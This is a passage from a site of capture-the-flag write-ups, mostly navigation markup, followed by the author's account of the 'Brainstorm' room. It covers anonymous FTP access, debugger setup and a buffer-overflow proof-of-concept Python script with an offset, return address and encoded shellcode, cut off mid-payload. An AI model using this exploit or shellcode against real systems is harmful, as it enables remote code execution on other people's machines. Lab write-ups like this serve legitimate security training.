+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Setting up the Dev environment">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#setting-up-the-sandbox" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setting up the sandbox
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#immunity-and-python" class="md-nav__link">
+    <span class="md-ellipsis">
+      Immunity and python
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mona" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mona
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#i-never-want-to-go-through-this-again" class="md-nav__link">
+    <span class="md-ellipsis">
+      I never want to go through this again
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#develop-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Develop the exploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit-the-target" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit the target
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../BufferOverFlowPrep/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    BufferOverFlowPrep
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Gatekeeper/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Gatekeeper
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Mr%20Robot/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Mr. Robot
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Skynet/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Skynet
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Untitled/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Untitled
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Vulnnet%20Roasted/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Vulnnet Roasted
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Vulnversity/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Vulnversity
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hackpark/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Hackpark
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../internal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Internal
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../overpass2hacked/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Overpass2hacked
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../steelmountain/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Steelmountain
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tomghost/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Tomghost
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_18" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_18" id="__nav_3_4_18_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Work in Progress
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_18_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_18">
+            <span class="md-nav__icon md-icon"></span>
+            Work in Progress
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Work%20in%20Progress/Anonymous/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Anonymous
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Work%20in%20Progress/BufferOverFlowPrep/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    BufferOverFlowPrep
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Work%20in%20Progress/Daily%20Bugle/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Daily Bugle
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Work%20in%20Progress/Ice/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Work%20in%20Progress/dogcat/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Dogcat
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Work%20in%20Progress/relevant/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Relevant
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_18_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_18_7" id="__nav_3_4_18_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Throwback
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_4_18_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_18_7">
+            <span class="md-nav__icon md-icon"></span>
+            Throwback
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Work%20in%20Progress/Throwback/10.200.70.138%20Throwback-FW01/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Throwback-FW01
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Work%20in%20Progress/Throwback/10.200.70.219%20Throwback-Prod/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Throwback-Prod
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Work%20in%20Progress/Throwback/10.200.70.232%20%20Throwback-Mail/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Throwback-Mail
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Work%20in%20Progress/Throwback/10.200.70.250/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    10.200.70.250
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Work%20in%20Progress/Throwback/10.41.0.2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    10.41.0.2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Work%20in%20Progress/Throwback/Loot/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Loot
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Work%20in%20Progress/Throwback/session%207/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Session 7
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Work%20in%20Progress/Throwback/session%208/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Session 8
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_5" id="__nav_3_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    VulnHub
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_5">
+            <span class="md-nav__icon md-icon"></span>
+            VulnHub
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Assertion%20101/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Assertion 101
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Cute/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cute
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Cybersploit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cybersploit
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/DC-1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    DC-1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/DC-2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    DC-2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Dawn/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Dawn
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Decoy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Decoy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Funbox%20EasyEnum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Funbox: EasyEnum
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Funbox%20Rookie/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Funbox Rookie
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Funbox3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Funbox3
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Gaara/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Gaara
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Geisha/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Geisha
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Inclusiveness/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Inclusiveness
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Katana/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Katana
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Lampiano/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lampiao
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Monitoring/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Monitoring
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Natraj/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Natraj
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Potato/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Potato
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/PyExp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PyExp
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/SAR/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Sar
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Seppuku/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Seppuku
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Solstice/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Solstice
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Sumo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Sumo
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Vegeta/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Vegeta
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/Y0usef/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Y0usef
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/noontide/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Noontide
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/oscp%20prep/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    OSCP prep
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../VulnHub/wpwn/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    wpwn
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recon
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Recon">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Scan
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#explore-the-services" class="md-nav__link">
+    <span class="md-ellipsis">
+      Explore the services
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Explore the services">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ftp" class="md-nav__link">
+    <span class="md-ellipsis">
+      FTP
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit-development" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit Development
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit Development">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#setting-up-the-dev-environment" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setting up the Dev environment
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Setting up the Dev environment">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#setting-up-the-sandbox" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setting up the sandbox
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#immunity-and-python" class="md-nav__link">
+    <span class="md-ellipsis">
+      Immunity and python
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mona" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mona
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#i-never-want-to-go-through-this-again" class="md-nav__link">
+    <span class="md-ellipsis">
+      I never want to go through this again
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#develop-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Develop the exploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit-the-target" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploit the target
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="brainstorm">Brainstorm<a class="headerlink" href="#brainstorm" title="Permanent link">&para;</a></h1>
+<h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
+<h3 id="scan">Scan<a class="headerlink" href="#scan" title="Permanent link">&para;</a></h3>
+<p>This room is a bit challenging. The scan shows ftp (21) and some chat client (9999). I only see these two, but apparently there are 6. Must be some UDP ports I missed.</p>
+<h3 id="explore-the-services">Explore the services<a class="headerlink" href="#explore-the-services" title="Permanent link">&para;</a></h3>
+<h4 id="ftp">FTP<a class="headerlink" href="#ftp" title="Permanent link">&para;</a></h4>
+<p>Anonymous login is allowed. I logged in with user <code>ftp</code> and pass <code>ftp</code> but kept hitting an error about <strong>Extended Passive Mode.</strong>. I did some reasearch to refresh my memory on what this was.</p>
+<pre><code class="language-bash">ftp 10.10.109.7
+Connected to 10.10.109.7.
+220 Microsoft FTP Service
+Name (10.10.109.7:nate): ftp
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||49356|) 
+</code></pre>
+<p>Long story short, you need to force active mode since passive mode is failing. I spent a lot of time googling this error and reading about how to fix it. But the answer was right in the damn man page; need to force active mode with the <code>-A</code> flag.</p>
+<pre><code class="language-bash">ftp 10.10.109.7 -A                                                      
+Connected to 10.10.109.7.                                                                                      
+220 Microsoft FTP Service
+Name (10.10.109.7:nate): ftp                                                                                   
+331 Anonymous access allowed, send identity (e-mail name) as password.                                         
+Password:                                                                                                      
+230 User logged in.                                                                                            
+Remote system type is Windows_NT.                                                                              
+ftp&gt; ls                                                                                                        
+200 EPRT command successful.
+150 Opening ASCII mode data connection.
+08-29-19  07:36PM       &lt;DIR&gt;          chatserver
+226 Transfer complete.
+</code></pre>
+<p>Great, it's working now and I see a folder.</p>
+<pre><code class="language-bash">ftp&gt; cd chatserver
+250 CWD command successful. 
+ftp&gt; ls
+200 EPRT command successful.
+150 Opening ASCII mode data connection.
+08-29-19  09:26PM                43747 chatserver.exe
+08-29-19  09:27PM                30761 essfunc.dll
+226 Transfer complete.
+</code></pre>
+<p>Find <code>chatserver.exe</code> and download it for later.</p>
+<pre><code class="language-bash">ftp&gt; get chatserver.exe
+local: chatserver.exe remote: chatserver.exe
+200 EPRT command successful.
+150 Opening ASCII mode data connection.
+100% |******************************************************************| 43747       43.33 KiB/s    00:00 ETA
+226 Transfer complete.
+WARNING! 45 bare linefeeds received in ASCII mode.
+File may not have transferred correctly.
+43747 bytes received in 00:00 (43.31 KiB/s)
+</code></pre>
+<p>Crap, I've ran into this before. Need to use <code>binary</code> to transfer executables.</p>
+<pre><code class="language-bash">ftp&gt; binary
+200 Type set to I.
+ftp&gt; get chatserver.exe
+local: chatserver.exe remote: chatserver.exe
+200 EPRT command successful.
+125 Data connection already open; Transfer starting.
+100% |******************************************************************| 43747       43.87 KiB/s    00:00 ETA
+226 Transfer complete.
+</code></pre>
+<h2 id="exploit-development">Exploit Development<a class="headerlink" href="#exploit-development" title="Permanent link">&para;</a></h2>
+<h3 id="setting-up-the-dev-environment">Setting up the Dev environment<a class="headerlink" href="#setting-up-the-dev-environment" title="Permanent link">&para;</a></h3>
+<h4 id="setting-up-the-sandbox">Setting up the sandbox<a class="headerlink" href="#setting-up-the-sandbox" title="Permanent link">&para;</a></h4>
+<p>Now I'll set up a Windows Dev environment in Windows Sandbox (I don't want to run this executable on my PC.)</p>
+<p>It appears to be working. Will not have to to do anything crafty with the network.</p>
+<p><img alt="Pasted image 20220210233944.png" src="../Pasted%20image%2020220210233944.png" /></p>
+<h4 id="immunity-and-python">Immunity and python<a class="headerlink" href="#immunity-and-python" title="Permanent link">&para;</a></h4>
+<p>Then install immunity, which also installs python. The python installer failed the first time around so I selected "Install just for this user" the second time around. Not sure if it was coincidence or lucky guess but it worked. Lets get crackin!</p>
+<p>Actually immunity wouldn't boot as it coulnd't find the python files. So I'm moving this project to a dev version of Windows 11 I have installed in the lab. It'll be a good first look at Windows 11 anyways. EDIT: Turns out it had nothing to do with the sandbox. It's possible this would have worked if I did all the below fixes, but everything is lost from a sandbox when the session is closed. It's probably better to use a VM anyways so I can maintain the debugging environment.</p>
+<p>I was able to get everything working in Windows 11. Had to configure Windows firewall to allow port 9999 though.</p>
+<p>Everything is working!</p>
+<p><img alt="Pasted image 20220211005230.png" src="../Pasted%20image%2020220211005230.png" /></p>
+<p>Seems like the overflow will be in the username. Lets fire up the tool.</p>
+<h4 id="mona">Mona<a class="headerlink" href="#mona" title="Permanent link">&para;</a></h4>
+<p>Looks like I spoke too soon about everything working. I got an error when trying to run a <code>!mona</code> command.</p>
+<blockquote>
+<p>pycommands: error importing module</p>
+</blockquote>
+<p>I see online this error is from using the 64-bit python and using a 32bit version should fix it. So...reinstall python with x86 version.</p>
+<p>Also, I need to install <a href="https://github.com/corelan/mona">mona</a>. Wow, setting up this environment is a PITA - it was nice having a box ready on TryHackMe for the other challenges. I'll have to save this setup.</p>
+<p>Another issue - since the file was downloaded from the internet, it has to be marked as safe in the file properties before it can be used.</p>
+<p><img alt="Pasted image 20220211015656.png" src="../Pasted%20image%2020220211015656.png" /></p>
+<p>Another issue I ran into was the <code>mona.py</code> file was full of HTML as I downloaded it incorrectly. Found that <a href="https://github.com/corelan/mona/issues/15">here on github</a></p>
+<h4 id="i-never-want-to-go-through-this-again">I never want to go through this again<a class="headerlink" href="#i-never-want-to-go-through-this-again" title="Permanent link">&para;</a></h4>
+<p>IT WORKS!!!!</p>
+<p>Getting a snapshot...</p>
+<h3 id="develop-the-exploit">Develop the exploit<a class="headerlink" href="#develop-the-exploit" title="Permanent link">&para;</a></h3>
+<p>I used the buffer overflow helper script I made and got this box done MUCH quicker than I was able to get the DEV environment set up. 
+<img alt="Pasted image 20220211021145.png" src="../Pasted%20image%2020220211021145.png" /></p>
+<p>I never turned off Windows AV module so I only had access for a bit before getting kicked.</p>
+<p><img alt="Pasted image 20220211021322.png" src="../Pasted%20image%2020220211021322.png" /></p>
+<p>The completed POC exploit is as follows:</p>
+<pre><code class="language-python3">#!/usr/bin/env python3
+
+import socket
+
+ip = &quot;192.168.1.104&quot;
+port = 9999
+
+prefix = &quot; &quot;
+offset = 6107
+overflow = &quot;A&quot; * offset
+retn = &quot;\xdf\x14\x50\x62&quot;
+padding = &quot;\x90&quot; * 16
+payload = &quot;\xbd\xcf\xbb\xca\x95\xdb\xc2\xd9\x74\x24\xf4\x58\x33\xc9\xb1\x52\x31\x68\x12\x03\x68\x12\x83\x27\x47\x28\x60\x4b\x50\x2f\x8b\xb3\xa1\x50\x05\x56\x90\x50\x71\x13\x83\x60\xf1\x71\x28\x0a\x57\x61\xbb\x7e\x70\x86\x0c\x34\xa6\xa9\x8d\x65\x9a\xa8\x0d\x74\xcf\x0a\x2f\xb7\x02\x4b\x68\xaa\xef\x19\x21\xa0\x42\x8d\x46\xfc\x5e\x26\x14\x10\xe7\xdb\xed\x13\xc6\x4a\x65\x4a\xc8\x6d\xaa\xe6\x41\x75\xaf\xc3\x18\x0e\x1b\xbf\x9a\xc6\x55\x40\x30\x27\x5a\xb3\x48\x60\x5d\x2c\x3f\x98\x9d\xd1\x38\x5f\xdf\x0d\xcc\x7b\x47\xc5\x76\xa7\x79\x0a\xe0\x2c\x75\xe7\x66\x6a\x9a\xf6\xab\x01\xa6\x73\x4a\xc5\x2e\xc7\x69\xc1\x6b\x93\x10\x50\xd6\x72\x2c\x82\xb9\x2b\x88\xc9\x54\x3f\xa1\x90\x30\x8c\x88\x2a\xc1\x9a\x9b\x59\xf3\x05\x30\xf5\xbf\xce\x9e\x02\xbf\xe4\x67\x9c\x3e\x07\x98\xb5\x84\x53\xc8\xad\x2d\xdc\x83\x2d\xd1\x09\x03\x7d\x7d\xe2\xe4\x2d\x3d\x52\x8d\x27\xb2\x8d\xad\x48\x18\xa6\x44\xb3\xcb\x09\x30\xba\x7b\xe2\x43\xbc\x6a\xae\xca\x5a\xe6\x5e\x9b\xf5\x9f\xc7\x86\x8d\x3e\x07\x1d\xe8\x01\x83\x92\x0d\xcf\x64\xde\x1d\xb8\x84\x95\x7f\x6f\x9a\x03\x17\xf3\x09\xc8\xe7\x7a\x32\x47\xb0\x2b\